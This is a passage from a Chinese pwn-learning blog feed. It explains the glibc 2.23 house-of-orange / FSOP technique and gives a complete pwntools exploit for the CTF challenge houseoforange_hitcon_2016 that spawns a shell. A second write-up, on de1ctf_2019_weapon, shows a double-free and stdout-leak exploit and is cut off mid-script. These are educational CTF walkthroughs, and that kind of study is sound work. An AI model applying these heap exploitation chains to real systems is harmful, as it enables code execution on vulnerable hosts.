class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是how2heap 2.23中的house of orange</p><p>这里前面的部分与上文中一直，我们看看在获得unsortbins之后的操作</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202503041710617.png" alt="image-20250304171013544"></p><p>现在io_list_all指向_IO_2_1_stderr_ 现在是正常的</p><p>​       </p><p>现在我们开始一步步完成这个实验后面过程的解释，我是从<strong>后面往前面</strong>顺序说的</p><h3 id="vatble表的劫持"><a href="#vatble表的劫持" class="headerlink" title="vatble表的劫持"></a>vatble表的劫持</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">  jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">  *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br></pre></td></tr></table></figure><p>找了个空间存放伪造的虚表的位置</p><p>然后把虚表的GI_IO_str_overflow改写成我们要的程序，因为系统会调用__GI_IO_str_overflow来刷新文件流</p><p>再把伪造的虚表写到io_file文件真正的虚表中去</p><h3 id="堆快的处理"><a href="#堆快的处理" class="headerlink" title="堆快的处理"></a>堆快的处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FILE *fp = (FILE *) top;</span><br><span class="line">fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line">fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br></pre></td></tr></table></figure><p>把top转化为文件结构体，并且改变改变部分用来绕过检查</p><h3 id="改写top堆快"><a href="#改写top堆快" class="headerlink" title="改写top堆快"></a>改写top堆快</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">top[<span class="number">1</span>] = <span class="number">0x61</span>; <span class="comment">//触发文件检查</span></span><br><span class="line">io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line">top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"><span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>因为top这里是unsortbin,我们现在的目的就是让我们io_list_all插入main_arena这个链表中，当文件检查到0x61</p><p>上面注释说了</p><p>回到最后malloc</p><p>调用malloc，io_list_all查到链表中，完成刷新，然后得到shell</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>学习自<a href="https://www.cnblogs.com/ZIKH26/articles/16712469.html"><a href="https://zikh26.github.io/posts/f0d8c344.html?highlight=orange#house-of-orange">关于house of orange(unsorted bin attack &amp;&amp;FSOP)的学习总结 | ZIKH26’s Blog</a></a></p><p>题目是：<code>houseoforange_hitcon_2016</code></p><p>buu：houseoforange_hitcon_2016</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>64位，保护全开</p><p>菜单题，edit处没有检查输入size的大小，所以我们可以利用这里进行堆溢出</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202504061951183.png" alt="image-20250406195053039"></p><p>又因为这个题目没有free函数，我们要是想泄露libc就必须利用堆溢出加上<code>house_of_orange</code>获得<code>unsortedbins</code>,从而获得libc，除此之外，因为这个题目限制了我们add和edit的次数，所以常规的一些改写钩子函数之类的用不了，所以我们这里选择劫持io，在泄露出libc和堆地址后，我们可以FSOP</p><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>先申请一个堆快，然后溢出，进行<code>house_of_orange</code>，将堆快放到unsortedbins中去</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202504062006224.png" alt="image-20250406200627170"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000002000000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">debug()</span><br><span class="line">show()</span><br></pre></td></tr></table></figure><p>再用同样的手法将堆地址泄露出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p>接下来，我们利用<code>unsortbins_atttack</code> 将<code>io_list_all</code>放到main-arena中去，再把我们这里的堆快的地址改成0x61（这样就相当于io_list_all-&gt;main-arena这里的地址就是我们改写后的堆快，也就是代表我们能直接控制io_file结构体）</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202504062045688.png" alt="image-20250406204550627"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure><p>再修改完之后，我们再将mode&#x3D;0,_IO_write_ptr&#x3D;1,_IO_write_base&#x3D;0</p><p>就可以触发_IO_flush_all_lockp，也就是vtable0x18处的函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202504062051060.png" alt="image-20250406205127012"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,25987)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/yfy/pwn_tools/buu_libc/16-64/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Name :&#x27;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Name:&#x27;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000002000000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;dddddddd&#x27;</span>)</span><br><span class="line">leak_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;&#x27;leak&#x27;,<span class="subst">&#123;<span class="built_in">hex</span>(leak_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base=leak_base-<span class="number">0x3c5188</span></span><br><span class="line">log.success(<span class="string">f&quot;&#x27;libc&#x27;,<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;&#x27;io_list&#x27;&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(io_list_all)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;leak_heap&#x27;&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(leak_heap)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment">#old top chunk fd &amp; bk</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x508</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)</span><br><span class="line">edit(<span class="number">0x1000</span>,payload)</span><br><span class="line">debug()</span><br><span class="line"><span class="comment"># add(0x10,b&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> how2heap(2.23) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>de1ctf_2019_weapon(利用IO泄露libc)</title>
      <link href="/posts/50063.html"/>
      <url>/posts/50063.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>buu的版本我没找到，换上buu的libc时，本地的ld又有问题，这里的版本就是2.23-0ubuntu3_amd64</p></blockquote><p><a href="https://www.getspwn.xyz/?p=61">本篇的脚本的思路来自这</a></p><h1 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h1><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231719165.png" alt="image-20250223171944078"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231720578.png" alt="image-20250223172004537"></p><p>保护全开并且没有show函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231720683.png" alt="image-20250223172040649"></p><p>并且我们申请的堆快只能在0x60大小往下到0</p><p>这个时候我们获得libc就是一件比较困难的事情</p><p>这题的洞很明显</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231724702.png" alt="image-20250223172403675"></p><p>uaf</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>所以我们利用的方法就是先进行堆快的重叠，达到unsortedbin中，获得libc,在改写stdout里面的write_base后得到libc，在改写malloc函数为one_gadgets</p><p>先申请5个堆快，按照0-&gt;1-&gt;0方式double free</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231728695.png" alt="image-20250223172822652"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x50</span>,<span class="number">0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">2</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">3</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">4</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0</span>,<span class="string">&#x27;\xb0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">1</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p>把0x5956dafe7000改成0x5956dafe70c0</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231730016.png" alt="image-20250223173009974"></p><p>放到我们伪造好的地方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x50</span>,<span class="number">7</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))</span><br></pre></td></tr></table></figure><p>伪造下个堆快的size的大小</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231941005.png" alt="image-20250223194146839"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231942757.png" alt="image-20250223194256705"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>free相应位置的堆快，放入unsortbin从而得到libc</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231735968.png" alt="image-20250223173525901"></p><p>我们可利用的目标就是我现在标亮的</p><p>但是这里的值不是我想要的，我们可以先动调出我们想要的地方，例如，我想改stdout</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231950991.png" alt="image-20250223195039948"></p><p>因为检查的原因，我们只能把堆申请到stdout-0x43这里</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231956194.png" alt="image-20250223195623153"></p><p>理论上来说，我们申请的地址和unsortbin自动分割出来的地址除了后四位不一样，前面的都一样，又因为后三位的数字是不变的，所以改变的只有倒数第四位，因此，这里要爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x50</span>,<span class="number">3</span>,<span class="string">b&#x27;aaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">4</span>,<span class="string">b&#x27;\xdd\x45&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,<span class="string">b&#x27;\xdd\x45&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x18cc27</span></span><br><span class="line"><span class="keyword">if</span> leak == -<span class="number">0x3c5600</span>:</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>我们再申请一个堆快就能发现</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502231948226.png" alt="屏幕截图 2025-02-23 194245"></p><p>我们可以更改stdout的wtite_base位</p><p>更改后就可以获得libc了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202502232005910.png" alt="image-20250223200542879"></p><p>接着利用函数的uaf改写malloc_hook函数成one_gadget</p><h2 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h2><p>改完后，我认为应该是再申请一个函数就可以获得shell,但是不行，而连续free两个堆快却可以获得shell</p><p>我去看看double free这个检查的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk);</span><br></pre></td></tr></table></figure><p>不知道这个one_gadget怎么触发的</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>这个脚本的版本和buu上面不太一样，不能直接打</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 